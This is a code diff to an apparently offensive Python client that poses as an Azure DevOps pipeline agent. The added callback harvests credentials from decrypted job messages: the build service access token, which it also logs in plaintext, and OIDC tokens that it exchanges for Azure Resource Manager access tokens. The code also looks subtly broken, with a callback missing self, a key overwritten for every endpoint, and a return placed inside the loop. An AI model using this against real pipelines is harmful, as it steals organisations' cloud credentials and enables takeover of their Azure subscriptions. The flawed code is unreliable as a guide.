@@ -193,6 +193,101 @@ class AzureDevOpsAgentClient( object ):
         self._session_key = algorithms.AES(aes_key)
         logging.info(f"Session Created with ID {self.session_id}")
 
+    def _default_message_callback(decrypted_message):
+        '''
+        Default callback when polling for devops messages. Collects job data and fetches
+        workload identity tokens. Any tokens that are fetched are added to an "azol_custom_results"
+        object in the returned dictionary.
+
+        Returns: a dictionary with the decrypted message, and any tokens that were identified
+        '''
+        timeline = decrypted_message["timeline"]["id"]
+        planId = decrypted_message["plan"]["planId"]
+        jobId = decrypted_message["jobId"]
+        resources = decrypted_message["resources"]
+        projectId = decrypted_message["variables"]["system.teamProjectId"]["value"]
+        oidc_endpoint=decrypted_message["variables"]["System.OidcRequestUri"]["value"]
+        system_access_token = decrypted_message["variables"]["system.accessToken"]["value"]
+        system_uri = decrypted_message["variables"]["system.taskDefinitionsUri"]["value"]
+        headers = {
+            "Authorization": f"Bearer {system_access_token}",
+            "Accept": "application/json; api-version=7.2-preview.1",
+            "Content-Type": "application/json; api-version=7.2-preview.1"
+        }
+        body = {
+            "value": [
+                {
+                    "id": jobId,
+                    "type": "Job",
+                    "name": "Job",
+                    "state": "inProgress"
+                }
+            ],
+            "count": 1
+        }
+
+        r = requests.patch(f"{system_uri}{projectId}/_apis/distributedtask/hubs/Build/"
+                            f"plans/{planId}/timelines/{timeline}/records", json=body, headers=headers)
+        
+        endpoints = resources["endpoints"]
+        azol_annotations = {}
+        azol_annotations["endpoints"] = {}
+        for endpoint in endpoints:
+            azol_annotations["endpoints"]["name"] = { "tokens": {} }
+            if endpoint["name"] == "SystemVssConnection":
+                devops_org = endpoint["data"]["ServerName"]
+                access_token=endpoint["authorization"]["parameters"]["AccessToken"]
+                logging.info(f"Found devOps build service access token for {devops_org}: \n{access_token}\n\n ")
+                azol_annotations["endpoints"]["name"]["tokens"]["buildService"] = access_token
+            elif endpoint["type"] == "azurerm":
+                azol_annotations["endpoints"]["type"]="azurerm"
+                
+                subscription_id = endpoint["data"]["subscriptionId"]
+                identity_type = endpoint["data"]["identityType"]
+                sc_id = endpoint["id"]
+                sc_name = endpoint["name"]
+                sc_created_by = endpoint["createdBy"]["uniqueName"]
+                sc_created_by_id = endpoint["createdBy"]["id"]
+                tenant_id = endpoint["authorization"]["parameters"]["tenantid"]
+                auth_scheme = endpoint["authorization"]["scheme"]
+                if auth_scheme == "WorkloadIdentityFederation":
+                    subject = endpoint["authorization"]["parameters"]["workloadIdentityFederationSubject"]
+                    issuer = endpoint["authorization"]["parameters"]["workloadIdentityFederationIssuer"]
+                    sp_id = endpoint["authorization"]["parameters"]["serviceprincipalid"]
+                    description = endpoint["description"]
+                    logging.info(f"Found service connection {sc_name}:{sc_id} with access to tenant {tenant_id} created by {sc_created_by}:{sc_created_by_id}.")
+                    logging.info(f"Service connection is a service principal set up with workload federation, subject {subject}, issuer {issuer}.")
+                    logging.info(f"Service Connection's service principal ID: {sp_id}")
+                    
+                query_params = {
+                    "serviceConnectionId": sc_id
+                }
+                logging.info("Fetching OIDC tokens...")
+                headers = {
+                    "Authorization": f"Bearer {system_access_token}",
+                    "Accept": "application/json; api-version=7.2-preview.1",
+                    "Content-Type": "application/json; api-version=7.2-preview.1"
+                }
+                r=requests.post(oidc_endpoint, headers=headers, params=query_params)
+                azol_annotations["endpoints"]["name"]["tokens"]["workloadIdentityFederationOidcToken"] = r.json()["oidcToken"]
+                logging.info("Fetching Access Tokens from ARM...")
+                authorization_server_url=f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token"
+                headers = {
+                    "Content-Type": "application/x-www-form-urlencoded"
+                }
+                body = {
+                    "scope": "https://management.azure.com/.default",
+                    "client_id": sp_id,
+                    "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
+                    "client_assertion": r.json()["oidcToken"],
+                    "grant_type": "client_credentials"
+                }
+                r=requests.post(authorization_server_url, headers=headers, data=body)
+                token = r.json()["access_token"]
+                azol_annotations["endpoints"]["name"]["tokens"]["arm_token"] = token
+                decrypted_message["azol_annotations"] = azol_annotations
+                return decrypted_message
+
     def poll(self, message_callback=None, max_messages=1, max_time=None):
         '''
             Poll the devOps pool for new messages.
@@ -210,15 +305,12 @@ class AzureDevOpsAgentClient( object ):
                                  if None, poll forever. defaults to None                                 
 
             Returns:
-                None
+                A python generator, which yields the results of the message callback
 
         '''
 
-        def stdout_callback(message):
-            pprint(message)
-
         if not message_callback:
-            message_callback = stdout_callback
+            message_callback = _default_message_callback
 
         number_messages_received = 0
         epoch_time = int(time.time())
@@ -253,8 +345,10 @@ class AzureDevOpsAgentClient( object ):
                     logging.error(resp.status_code)
                     logging.error(resp.content)
                     raise DevOpsAgentSessionCreationException()
+                logging.info("Got message. Deserializing to json...")
                 message_json = resp.json()
 
+                logging.info("Trying to decrypt...")
                 iv_b64 = message_json["iv"]
                 iv=base64.b64decode(iv_b64)
                 encrypted_b64_message=message_json["body"]
@@ -269,7 +363,8 @@ class AzureDevOpsAgentClient( object ):
 
                 plaintext = unpadder.update(plaintext) + unpadder.finalize()
                 decrypted_message=json.loads(plaintext)
-                message_callback(decrypted_message)
+                logging.info("Sending message to callback...")
+                yield message_callback(decrypted_message)
                 number_messages_received += 1
 
             except requests.exceptions.Timeout:
